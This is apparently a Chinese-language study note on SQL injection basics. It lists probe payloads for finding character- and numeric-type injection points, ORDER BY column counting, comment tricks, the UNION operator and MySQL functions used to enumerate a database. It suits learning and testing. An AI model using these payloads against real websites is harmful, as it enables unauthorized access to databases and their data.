---

title: sql注入

date: 2023-12-26 02:01:50

tags:

---

sql注入



------

[TOC]

<!--more-->

# 判断注入点

## 	1.字符型

```sql

id=1' and 1 = 1--+
id=1' and 1 = 2--+

如果不正常回显说明存在该注入点
```



## 	2.数字型	

```sql
id=1 and 1 = 1--+
id=1 and 1 = 2--+
```



# 判断字符段数量

```sql
id=1' order by 3 --+
id=1' order by 4 --+

order by 
	order by 字段名  -- 这是常规用法
	order by int    --  这是数字替代了字段的位置。
所以因此可以判断有几个字段
	不正常回显。说明语句错误。说明不存在那么多的字段数
	
```

# sql注释代码

```sql
-- 单行注释     --与注释内容必须用空格隔开才有效
--这样就不行
--+某原因 +成为空格
/*
	多行注释
*/
```

# SQL UNION 操作符

```sql
-- 用来合并多个select查询语句的结果集
/*UNION 操作符用于合并两个或多个 SELECT 语句的结果集。

请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。
*/
SELECT column_name(s) FROM table1
UNION
SELECT column_name(s) FROM table2;
```

```sql
-- 演示
mysql> SELECT * FROM Websites;
+----+--------------+---------------------------+-------+---------+
| id | name         | url                       | alexa | country |
+----+--------------+---------------------------+-------+---------+
| 1  | Google       | https://www.google.cm/    | 1     | USA     |
| 2  | 淘宝          | https://www.taobao.com/   | 13    | CN      |
| 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | CN      |
| 4  | 微博          | http://weibo.com/         | 20    | CN      |
| 5  | Facebook     | https://www.facebook.com/ | 3     | USA     |
| 7  | stackoverflow | http://stackoverflow.com/ |   0 | IND     |
+----+---------------+---------------------------+-------+---------+

mysql> SELECT * FROM apps;
+----+------------+-------------------------+---------+
| id | app_name   | url                     | country |
+----+------------+-------------------------+---------+
|  1 | QQ APP     | http://im.qq.com/       | CN      |
|  2 | 微博 APP | http://weibo.com/       | CN      |
|  3 | 淘宝 APP | https://www.taobao.com/ | CN      |
+----+------------+-------------------------+---------+
3 rows in set (0.00 sec)

```

# sql函数

```sql
DATABASE	查看数据库
CURRENT_USER	返回服务器用来验证当前客户端的 MySQL 帐户的用户名和主机名
SESSION_USER    返回当前 MySQL 用户名和主机名
SYSTEM_USER	 	返回当前 MySQL 用户名和主机名
VERSION	 		返回 MySQL 数据库的当前版本
USER			返回当前 MySQL 用户名和主机名
```

